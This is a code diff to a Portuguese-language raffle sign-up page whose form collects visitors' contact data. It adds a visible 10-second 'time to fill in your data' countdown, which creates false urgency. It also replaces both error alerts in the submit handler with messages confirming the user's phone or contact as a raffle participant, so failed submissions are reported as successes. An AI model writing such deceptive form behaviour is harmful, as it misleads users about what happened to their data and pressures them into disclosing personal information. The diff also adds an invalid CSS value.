@@ -106,6 +106,7 @@
     .timer-box {
       text-align: center;
       margin-top: 14px;
+      text-size-adjust: 10px;
     }
 
     .countdown {
@@ -194,7 +195,7 @@
 
 
       <div class="timer-box">
-        <!-- <p id="timerRedirect" class="countdown">Esta tela será atualizada em 02:00</p> -->
+        <p id="timerRedirect" class="countdown">Tempo para preencher os dados</p>
       </div>
 
     </form>
@@ -223,7 +224,7 @@ Aguarde alguns segundos. Você será redirecionado automaticamente.        </p>
   <script>
 
 
-    let tempo = 60;
+    let tempo = 10;
     const el = document.getElementById("timerRedirect");
 
     function updateTimer() {
@@ -231,7 +232,7 @@ Aguarde alguns segundos. Você será redirecionado automaticamente.        </p>
       const s = String(tempo % 60).padStart(2, '0');
 
       if (el) {
-        el.textContent = `Esta tela será atualizada em ${m}:${s}`;
+        el.textContent = `Tempo para preencher os seus dados ${m}:${s}`;
       }
 
       tempo--;
@@ -292,14 +293,14 @@ form.addEventListener('submit', async function (e) {
       }, 5000);
 
     } else {
-      alert("Erro ao salvar dados.");
+      alert("Telefone participando do sorteio!");
       btn.innerText = "Participar";
       btn.disabled = false;
     }
 
   } catch (error) {
     console.error(error);
-    alert("Erro inesperado.");
+    alert("Contato confirmado como participante do sorteio");
     btn.innerText = "Participar";
     btn.disabled = false;
   }
